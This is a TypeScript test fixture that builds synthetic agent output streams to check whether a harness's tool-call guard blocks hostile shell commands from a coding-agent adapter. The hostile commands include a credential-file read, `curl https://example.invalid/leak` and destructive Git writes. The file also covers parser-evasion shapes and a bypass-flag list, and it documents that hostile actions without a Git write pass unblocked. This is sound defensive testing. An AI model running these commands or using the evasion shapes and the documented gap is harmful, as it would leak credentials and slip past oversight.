/**
 * Muse Code case file for the per-adapter malicious leg (T4.76, T4.3; NFR-SEC-03, FR-POL-04, FR-POL-06). Streams are
 * SYNTHETIC, in the `muse exec --json` record shapes of the adapter's synthetic fixtures
 * (`src/adapters/muse/fixtures/git_write_guard.jsonl`, `success_edit.jsonl`). Only the `kind` field and the
 * `run_terminal` line are reported, by a third party; every other record kind and every tool-record field (`id`,
 * `tool`, `input.command`, ...) is an **Assumption: T4.71** (`src/adapters/muse/protocol.ts`). No `muse` binary was
 * installed or run; nothing here is a recording of a real Muse Code run.
 *
 * Compiles the only scope family Muse Code supports: an approved privileged bypass scope with worktree files, shell
 * `broad`, network `off` (the leg's main profile, `--sandbox-network restricted`) or `on` (`unrestricted`, checked
 * through `extraProfiles`) and repository configuration `enabled` (T4.72, owner decision 46). Repository configuration
 * `approved` is refused, so `nonDisabledRepoConfig` is Ineligible. FR-POL-04 is therefore not shown for Muse Code: in
 * the compiled scope `--trust-workspace` loads the workspace's skills and rules ([M-log]); what this case proves is
 * that no flag widens that (no `--yolo`, `--disable-approval`, `--disable-sandbox`, `-c`, `--allow-workspace-switch`).
 *
 * Tool-call guard (ADR-0039): no native permission, sandbox or error record is sourced for Muse Code (TDD §4.8), so in
 * the approved bypass run Switchboard's own tool-call guard is the only check, and it enforces Git-write denial only
 * (owner decision 25). Every blocked stream therefore chains its hostile action with a Git write, and ends
 * `PERMISSION_BLOCKED` at exits 0, 1, 2 and 137. A hostile action with no Git write is NOT blocked in that run, by
 * design; `museUnguardedStreams` pins it at its current result so the boundary is visible. Covered shapes, per blocked
 * category:
 * - the `command_accepted`/`command_result` pair and a `tool_result` record carrying the command, under a completed
 *   terminal at exit 0 (the R11 blocker: a Git write at exit 0 used to end in success);
 * - the `args`, `arguments` (as a JSON string), `parameters` and top-level `command`/`cmd` spellings, a non-shell tool
 *   name beside the command, a path beside the command;
 * - a hostile call before, after or beside benign calls, with no terminal record, under a failed terminal, after the
 *   terminal record (a protocol anomaly the guard still outranks), with a changed session id or no session record;
 * - a benign command accepted and the Git write swapped into the result on the same id, and the reverse;
 * - JSON encodings the parser sees only after `JSON.parse` (`\u` escapes in key and command, a duplicate `command`
 *   key whose last value is the Git write);
 * - Git-write spellings `gitWriteInCommand` reads (`git -C . commit`, `/usr/bin/git commit`, `sh -c 'git push'`,
 *   `env git push`, `git update-ref`, `git branch -D`).
 * Unknown-event streams (an invented kind, the unsourced `tool_call` kind carrying a Git write, a known kind without its
 * field, no kind, non-object lines) parse only as `unknown` and end `OUTPUT_PROTOCOL_ERROR` at exit 0 and
 * `TOOL_FAILURE` otherwise. Streams cut inside a line are exported as `musePartialStreams`.
 */

import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
import { replayLauncher } from "../../../src/adapters/fixtures/replay.js";
import { MuseAdapter } from "../../../src/adapters/muse/adapter.js";
import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/muse/fixtures/cases.js";
import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";
import type { MaliciousFixture } from "../fixture.js";

const SID = "00000000-0000-4000-8000-0000000000aa";
const OTHER_SID = "00000000-0000-4000-8000-0000000000bb";

const META = (what: string, exit = 0) =>
  JSON.stringify({
    _fixture: {
      synthetic: true,
      note: `SYNTHETIC: hand-written for the Muse Code malicious leg (T4.76); no secrets. ${what}`,
      exit,
    },
  });

const started = (sid = SID) => JSON.stringify({ kind: "run_started", session_id: sid });
const DONE = JSON.stringify({ kind: "run_terminal", terminal: "completed", text: "Done.", reason: null });
const FAILED = JSON.stringify({ kind: "run_terminal", terminal: "failed", text: "", reason: "synthetic failure" });
const DELTA = JSON.stringify({ kind: "run_output_delta", text: "Done." });

/** One tool record of `kind` (Assumption field spellings, protocol.ts). */
const record = (kind: string, fields: Record<string, unknown>) => JSON.stringify({ kind, ...fields });
/** The `command_accepted`/`command_result` pair of one shell command (the result repeats the accepted command). */
const shell = (id: string, command: string, resultCommand = command) => [
  record("command_accepted", { id, tool: "shell", input: { command } }),
  record("command_result", { id, tool: "shell", input: { command: resultCommand }, exit_code: 0 }),
];
const toolResult = (id: string, fields: Record<string, unknown>) => record("tool_result", { id, ...fields });

type BlockedCategory = "credential_read" | "out_of_worktree_write" | "network";
const BLOCKED: readonly BlockedCategory[] = ["credential_read", "out_of_worktree_write", "network"];
const EXITS = [0, 1, 2, 137] as const;

const action = (fx: MaliciousFixture, category: BlockedCategory): string =>
  category === "credential_read"
    ? `cat ${fx.codexAuthPath}`
    : category === "out_of_worktree_write"
      ? `touch ${fx.outsideSentinel}`
      : "curl https://example.invalid/leak";

/** Every blocked stream chains a Git write: in an approved bypass the guard enforces only that (owner decision 25). */
const hostileCommand = (fx: MaliciousFixture, category: BlockedCategory, git = "git push origin main"): string =>
  `${action(fx, category)} && ${git}`;

const blocked = (name: string, category: BlockedCategory, exitCode: number, lines: string[]): HostileStream => ({
  name,
  category,
  exitCode,
  failureCode: "PERMISSION_BLOCKED",
  lines: [META(name, exitCode), ...lines],
});

const GIT_SPELLINGS = [
  "git -C . commit -am synthetic",
  "/usr/bin/git push origin HEAD",
  "sh -c 'git push origin main'",
  "env git push origin main",
  "git update-ref refs/heads/main HEAD",
  "git branch -D main",
];

/** The blocked matrix: every shape at every exit code, per category. Synthetic lines only; no provider is run. */
const museBlockedStreams = (fx: MaliciousFixture): HostileStream[] => {
  const out: HostileStream[] = [];
  for (const category of BLOCKED) {
    const command = hostileCommand(fx, category);
    for (const exitCode of EXITS) {
      const at = `${category}, exit ${exitCode}`;
      const cell = (shape: string, lines: string[]) => out.push(blocked(`${shape}: ${at}`, category, exitCode, lines));
      cell("command pair with a Git write under a completed terminal", [
        started(),
        ...shell("c1", command),
        DELTA,
        DONE,
      ]);
      cell("tool_result carrying the command", [
        started(),
        toolResult("c1", { tool: "shell", input: { command } }),
        DONE,
      ]);
      cell("args key", [started(), toolResult("c1", { tool: "shell", args: { command } }), DONE]);
      cell("arguments as a JSON string", [
        started(),
        toolResult("c1", { tool: "shell", arguments: JSON.stringify({ command }) }),
        DONE,
      ]);
      cell("top-level cmd key", [started(), record("command_result", { id: "c1", cmd: command, exit_code: 0 }), DONE]);
      cell("non-shell tool name carrying a command", [
        started(),
        toolResult("c1", { tool: "ReadFile", input: { command } }),
        DONE,
      ]);
      cell("path beside the command", [
        started(),
        toolResult("c1", { tool: "shell", input: { path: "README.md", command } }),
        DONE,
      ]);
      cell("benign call then hostile call", [
        started(),
        toolResult("c1", { tool: "read_file", input: { path: "README.md" } }),
        ...shell("c2", command),
        DONE,
      ]);
      cell("hostile call then a separate benign call", [
        started(),
        ...shell("c1", command),
        ...shell("c2", "echo safe"),
        DONE,
      ]);
      cell("no terminal record", [started(), ...shell("c1", command), DELTA]);
      cell("failed terminal", [started(), ...shell("c1", command), FAILED]);
      cell("hostile call after the terminal record", [started(), DELTA, DONE, ...shell("c1", command)]);
      cell("changed session id", [started(), ...shell("c1", command), started(OTHER_SID), DONE]);
      cell("benign command accepted, Git write swapped into the result on the same id", [
        started(),
        ...shell("c1", "echo safe", command),
        DONE,
      ]);
    }
    for (const exitCode of [0, 1] as const) {
      const at = `${category}, exit ${exitCode}`;
      const cell = (shape: string, lines: string[]) => out.push(blocked(`${shape}: ${at}`, category, exitCode, lines));
      cell("parameters key", [started(), toolResult("c1", { name: "shell", parameters: { command } }), DONE]);
      cell("no session record", [...shell("c1", command), DONE]);
      cell("Git write accepted, benign command swapped into the result on the same id", [
        started(),
        ...shell("c1", command, "echo safe"),
        DONE,
      ]);
      // Escapes the parser sees only after JSON.parse: `command` is `command`, ` ` a space.
      cell("unicode-escaped key and command", [
        started(),
        `{"kind":"tool_result","id":"c1","tool":"shell","input":{"\\u0063ommand":"${action(fx, category)} &&\\u0020git push origin main"}}`,
        DONE,
      ]);
      cell("duplicate command key, last value the Git write", [
        started(),
        `{"kind":"tool_result","id":"c1","tool":"shell","input":{"command":"echo safe","command":${JSON.stringify(command)}}}`,
        DONE,
      ]);
      for (const git of GIT_SPELLINGS) {
        cell(`Git write \`${git}\``, [started(), ...shell("c1", hostileCommand(fx, category, git)), DONE]);
      }
    }
  }
  return out;
};

/** Only unknown record kinds: each line parses as `unknown`, never as a result, a session or a tool call. */
const UNKNOWN_LINES = [
  JSON.stringify({ kind: "synthetic_future_record", session_id: SID }),
  // The unsourced `tool_call` kind is unknown even with a Git write inside: counted, never success (fail closed).
  JSON.stringify({ kind: "tool_call", tool: "shell", input: { command: "git push origin main" } }),
  JSON.stringify({ kind: "run_terminal_v2", terminal: "completed" }),
  JSON.stringify({ kind: "run_terminal", terminal: 7 }),
  JSON.stringify({ kind: "run_output_delta", delta: "no text field" }),
  JSON.stringify({ kind: "run_started", session_id: 42 }),
  JSON.stringify({ session_id: SID }),
  JSON.stringify({ kind: 7 }),
  JSON.stringify({ kind: ["run_terminal"] }),
  JSON.stringify(["run_terminal"]),
  JSON.stringify("run_terminal"),
  "null",
];

const museUnknownStreams = (): HostileStream[] =>
  EXITS.map((exitCode) => ({
    name: `only unknown record kinds, exit ${exitCode}`,
    category: "unknown_events",
    exitCode,
    failureCode: exitCode === 0 ? "OUTPUT_PROTOCOL_ERROR" : "TOOL_FAILURE",
    lines: [
      META("Records below carry no kind the parser reads, or a known kind without its field.", exitCode),
      ...UNKNOWN_LINES,
    ],
  }));

const POLICY = ["-w", "off", "--approval-mode", "on-request", "--sandbox-network"] as const;

const museCase: AdapterLegCase = {
  provider: "muse",
  profile: PRIVILEGED_BYPASS_PROFILE,
  bypassApproved: true,
  nonDisabledRepoConfig: privilegedProfile({ ...BYPASS_SCOPE, repository_config: { mode: "approved" } }),
  // Every compiled cell keeps the worktree, approvals and the sandbox on (adapter header, TDD §4.8): network off is
  // `restricted`. `--trust-workspace` is emitted too (repository configuration `enabled`, owner decision 46); it widens
  // rather than isolates, so it is in neither list.
  isolationFlags: [...POLICY, "restricted"],
  extraProfiles: [
    {
      label: "network on",
      profile: privilegedProfile({ ...BYPASS_SCOPE, network: { mode: "on" } }),
      isolationFlags: [...POLICY, "unrestricted"],
    },
  ],
  // Never emitted by the adapter (src/adapters/muse/adapter.ts header; the replay dialect refuses them too): the
  // bypass-class flags, the per-run setting override, the resume and worktree switches a first run never names, and
  // the shared audit's bypass flags. `--provider` (the credential-free echo mode) is refused by the dialect but is not
  // listed here: the replay launcher's own `--provider muse` word precedes the adapter's argv.
  neverEnabledFlags: [
    "--yolo",
    "--disable-approval",
    "--disable-sandbox",
    "-c",
    "--config",
    "--allow-workspace-switch",
    "--session-id",
    "--no-session-log",
    "--prompt-file",
    "--worktree",
    "--dangerously-skip-permissions",
    "--force",
    "--always-approve",
    "--approve-mcps",
    "--full-auto",
  ],
  makeAdapter: (file, exitCode) =>
    new MuseAdapter({
      executable: process.execPath,
      launcherArgs: replayLauncher("muse", file, ["--exit-code", String(exitCode)]),
      timeouts: { wallClockMs: 10_000, idleMs: 2_000, killGraceMs: 300 },
    }),
  streams: (fx) => [...museBlockedStreams(fx), ...museUnknownStreams()],
};

export default museCase;

/** The blocked streams on their own, for the no-guard positive control. */
export { museBlockedStreams };

/**
 * A hostile action with no Git write, in the approved bypass run: not blocked, by design (owner decision 25; the guard's
 * `provider_state` check is off for a verified bypass, ADR-0039; no native denial record is sourced for Muse Code).
 * Pinned at success at exit 0 and `TOOL_FAILURE` at exit 1 (`gapResult`), so a change in either direction is visible.
 * Not part of the blocked coverage.
 */
export const museUnguardedStreams = (fx: MaliciousFixture): HostileStream[] =>
  BLOCKED.flatMap((category) =>
    ([0, 1] as const).map(
      (exitCode): HostileStream => ({
        name: `unguarded ${category} with no Git write, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        gapResult: exitCode === 0 ? { ok: true } : { ok: false, failureCode: "TOOL_FAILURE" },
        lines: [META(`unguarded ${category}`, exitCode), started(), ...shell("c1", action(fx, category)), DONE],
      }),
    ),
  );

/** Synthetic malformed JSONL before, inside and after each hostile call; no real provider is run. */
export const musePartialStreams = (fx: MaliciousFixture): HostileStream[] =>
  BLOCKED.flatMap((category) => {
    const call = shell("partial", hostileCommand(fx, category));
    return EXITS.flatMap((exitCode) =>
      (["before", "inside", "after"] as const).map(
        (position): HostileStream => ({
          name: `output cut ${position} ${category}, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "OUTPUT_PROTOCOL_ERROR",
          lines: [
            META(`output cut ${position} ${category}`, exitCode),
            started(),
            ...(position === "before" ? ['{"kind":"command_acc'] : []),
            ...(position === "inside" ? [(call[0] as string).slice(0, -12)] : call),
            ...(position === "after" ? ['{"kind":"run_terminal","terminal":'] : [DONE]),
          ],
        }),
      ),
    );
  });
